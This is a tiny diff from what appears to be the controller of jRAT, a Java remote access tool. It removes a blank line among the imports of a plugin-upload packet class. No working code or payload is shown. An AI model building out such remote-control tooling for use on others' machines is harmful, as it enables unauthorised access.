@@ -1,7 +1,6 @@
 package io.jrat.controller.packets.outgoing;
 
 import io.jrat.controller.threads.UploadThread;
-
 import java.io.File;
 
 public class Packet106ServerUploadPlugin extends Packet42ServerUploadFile {
